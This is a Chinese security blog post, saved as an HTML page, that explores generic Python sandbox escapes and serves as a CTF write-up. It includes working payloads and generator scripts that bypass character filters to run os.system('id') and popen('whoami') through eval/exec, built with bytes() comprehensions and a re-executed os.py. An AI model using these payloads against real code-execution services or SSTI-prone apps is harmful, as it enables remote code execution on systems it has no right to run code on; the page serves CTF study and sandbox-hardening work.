@@ -1,0 +1,1076 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="这篇其实有《OrangeKiller CTF 第 3 期》中所有需要的知识点，也算 wp 了。提前祝各位国庆快乐！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 沙箱逃逸的通解探索之路">
+<meta property="og:url" content="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="这篇其实有《OrangeKiller CTF 第 3 期》中所有需要的知识点，也算 wp 了。提前祝各位国庆快乐！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
+<meta property="article:published_time" content="2022-09-28T19:30:00.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/python.jpeg/cover">
+  
+  
+  
+  <title>Python 沙箱逃逸的通解探索之路 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Python 沙箱逃逸的通解探索之路"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-28 19:30" pubdate>
+          2022年9月28日 19:30:00
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          48 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Python 沙箱逃逸的通解探索之路</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这篇其实有《OrangeKiller CTF 第 3 期》中所有需要的知识点，也算 wp 了。提前祝各位国庆快乐！</p>
+<span id="more"></span>
+<h2 id="说在前面">说在前面</h2>
+<p>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os。</p>
+<p>其次，在大多数 Python 的 SSTI 中，沙箱逃逸中可以使用的手段，通常来说也可以用在 SSTI 里，至少也能起到一个重要的指导意义。</p>
+<p>其实沙箱逃逸大部分知识点，在 19 年 5 月我就已经整理完发布出来了，在看本篇之前，建议再看下这篇复习一下：</p>
+<p>https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</p>
+<p>那么为什么还有这篇呢？</p>
+<p>正如《OrangeKiller CTF 第 3 期》中所说，在做这期题目的时引出了本文的探索。同时，本篇也作为 wp 公布下第三期中题目的解法。</p>
+<h2 id="通解探索">通解探索</h2>
+<p>一切还是要从这道题目开始。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/34a1cf65-ce14-433a-937f-4ae50941883a.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>解释一下：构造出一个 CMD，这个 CMD 经过这个 <code>all</code> 的计算后结果必须为 <code>True</code>，且 <code>eval(CMD)</code> 需要可以在 os shell 里执行 <code>id</code>（其实就是实现 RCE 啦）。</p>
+<h3 id="解法一">解法一</h3>
+<p>从执行上下文看，我们要构造出的 <code>CMD</code> 显然是一个字符串，因为下面会进行 <code>eval</code>。那么这里就有第一个问题：如何构造出任意字符串？</p>
+<p>因为上面的限制条件把 <code>"</code>、<code>'</code> 都干掉了，所以直觉上我们会选择用 <code>chr</code> + <code>+</code> 来拼接出字符串，但是 <code>+</code> 也被干掉了。</p>
+<p>而由于 <code>,</code> 也被干掉了，所以虽然能调用函数，但是也只能传一个参数。并且 <code>.</code> 也被限制掉了，所以就算可以 <code>__import__</code> 也没法调用方法。</p>
+<p>对 Python CTF 题比较熟悉的橘友，第一反应可能是用 <code>list</code>+<code>dict</code>：<code>list(dict(whoami=1))[0]</code>。这个 payload 还是比较好用的，但问题是，由于 <code>whoami</code> 作为参数名，无法携带一些特殊的字符，例如空格、引号、括号 等等，所以仅凭这个手法去构造的 exp，在实际的利用过程中不是非常实用。</p>
+<p>所以需要寻找其他办法。经过一番寻找，我在内置的函数中发现了 <code>bytes()</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/98250afa-427f-4532-9fc1-3d19688efbb5.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>也就是说，这个函数可以接收一个可迭代对象，里面是 0-256 的整数，然后就会返回一个 bytes：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/bc29ce37-24cc-4fa7-8cb7-6eb89715283b.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>由于 <code>range()</code> 是固定顺序的，无法得到我们要的任意字符串。那么接下来问题就变成了：如何构造包含任意序列的整数的可迭代对象？</p>
+<p>如果能构造出 <code>[119, 104, 111, 97, 109, 105]</code> 这样的序列，那么就可以通过 <code>bytes()</code> 得到 <code>whoami</code>。由于不能使用 <code>,</code>，所以不能直接写一个列表或者集合之类的出来。</p>
+<p>最先映入我脑海中的是列表推导式，因为可以通过 <code>if</code> 来从列表中捞需要的数据。那么问题是这个布尔表达式要怎么写呢？先思考一下：对于一个有序的列表，若想捞出任意排序的字符串，不但需要固定下来每个字符的位置，还需要保证固定位置是特定的字符，所以肯定需要两个条件组合，那么 payload 就呼之欲出了：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">In [<span class="hljs-number">1</span>]: <span class="hljs-built_in">bytes</span>([<br>    ...:     j <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)<br>    ...:     <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">119</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">104</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">111</span><br>    ...:     <span class="hljs-keyword">or</span> i == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">97</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">109</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">5</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">105</span><br>    ...: ])<br>Out[<span class="hljs-number">1</span>]: <span class="hljs-string">b&#x27;whoami&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>对应的构造脚本：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([j for i in range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>) for j in range(256) if &quot;</span>+<span class="hljs-string">&quot; or &quot;</span>.join([<span class="hljs-string">f&quot;i==<span class="hljs-subst">&#123;i&#125;</span> and j==<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]))&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>还有一个空格的限制，这个姿势在 OrangeKiller CTF 的第二期已经说过了，用 <code>[]</code> 来替代。构造脚本：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]==[<span class="hljs-subst">&#123;i&#125;</span>]and[j]==[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]))&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>如果额外限制了 <code>==</code>，那么还可以用 <code>in</code> 来代替：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]in[[<span class="hljs-subst">&#123;i&#125;</span>]]and[j]in[[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]]))&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>最后这个 exp 长这样：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/cd8ff966-db58-4924-9e1e-ce4e7f4748dd.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>如果 <code>bytes</code> 之类的内置函数被禁用了，可以通过 Unicode 来绕过，这个技巧我们已经见得多了，就不多说了。</p>
+<p>所以，这个 payload 在大多数情况下已经可以通用了。</p>
+<h3 id="解法二">解法二</h3>
+<p>解法一有一个比较大的问题是，<code>if</code> 是没办法用 Unicode 绕过的。假如被禁了那么就 GG 了。所以，在上面条件限制的基础上，我们把 if 干掉，看看能否找到解决办法。</p>
+<p>经过一番思索，我给出的第二个答案是：模拟 import。</p>
+<p>我们知道，import 可以认为是打开源码之后执行代码。那么我们可以手动模拟这个过程，也就是 <code>exec(open(...).read())</code>，从而引入所需的函数。</p>
+<p>首先面临的问题是：如何知道库的绝对路径呢？对于部分题目来说，可能存在绝对路径泄露，但是这个并不通用，我不喜欢。其实 <code>__import__</code> 之后，返回的 module 经过 str 就会有绝对路径：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/37029d2b-cb60-49cb-a51e-275c8e67cae8.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以就可以这样：<code>open(str(__import__("os"))[19:-2])</code>。</p>
+<p>问题又来了，要想读出文件内容，通常我们会用 <code>.read()</code>，但是 <code>.</code> 已经被干掉了。好在，<code>open</code> 的返回值是 <code>_io.TextIOWrapper</code>，由于存在 <code>__iter__</code> 方法，所以我们可以把它当做是一个可迭代对象来迭代。也就是可以通过 <code>list(open(str(__import__("os"))[19:-2]))</code> 取出文件内容，这个效果等价与 <code>open(...).readlines()</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/958db08e-a6c6-4a5b-97d1-dbe9212f9aec.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>那么问题又来了，这种形式的源码，<code>exec</code> 是没法执行的。由于存在各种限制，<code>join</code> 这种都不用想了。经过一番思索，我感觉还是得用到列表推导。思路是用一个二层循环，一层将列表里的字符串拆解出来，例如 <code>["ab", "cd"]</code> 转为 <code>["a", "b", "c", "d"]</code>；第二层将列表里的字符，转为 ASCII 码，然后再用 <code>bytes</code> 转为完整的字符串。</p>
+<p>payload 如下（这里的缩进只是为了更好地理解，实际上是不需要的）：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-built_in">ord</span>(j)<br>        <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>            <span class="hljs-built_in">list</span>(<br>                <span class="hljs-built_in">open</span>(<br>                    <span class="hljs-built_in">str</span>(<br>                        <span class="hljs-built_in">__import__</span>(<br>                            <span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(os=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>                        )<br>                    )[<span class="hljs-number">19</span>:-<span class="hljs-number">2</span>]<br>                )<br>            )<br>        )<br>        <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>    ])<br>)<br></code></pre></td></tr></table></figure></p>
+<p>至此，我们就可以在上下文中执行 <code>os.py</code> 里的所有函数了：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/af219641-daab-49d9-9ef7-fbe120561c67.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>由于上述载入函数和执行函数是分开执行的，不是很优雅，有办法合并成一句执行么？</p>
+<p>首先分析一下，payload 必须在执行函数之前运行，所以可以通过 <code>[exec(...)][0][system("whoami")]</code> 来实现，需要注意的是，<code>system</code> 在运行成功的时候才会返回 <code>0</code>，一旦失败，返回的数字比较大，命令虽然已执行成功，但是整个 payload 的执行是会失败的，可能会遇到不必要的麻烦。并且，形如 <code>popen</code> 这种返回字符串的，也不宜这样利用。</p>
+<p>更好的方式是用 <code>[str][bool(exec...)](list(popen("whoami")))</code></p>
+<p>所以解法二的 payload 如下：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py">[<span class="hljs-built_in">str</span>][<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-built_in">ord</span>(j)<br>        <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>            <span class="hljs-built_in">list</span>(<br>                <span class="hljs-built_in">open</span>(<br>                    <span class="hljs-built_in">str</span>(<br>                        <span class="hljs-built_in">__import__</span>(<br>                            <span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(os=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>                        )<br>                    )[<span class="hljs-number">19</span>:-<span class="hljs-number">2</span>]<br>                )<br>            )<br>        )<br>        <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>    ])<br>))](<span class="hljs-built_in">list</span>(popen(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/53068e2a-1a60-474f-9ac5-28eb573706fa.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当然，上面这个 payload，同样存在特殊字符无法构造的问题，执行 <code>whoami</code> 这种单一的命令是 ok 的，如果想要反弹个 shell 就没法搞了。</p>
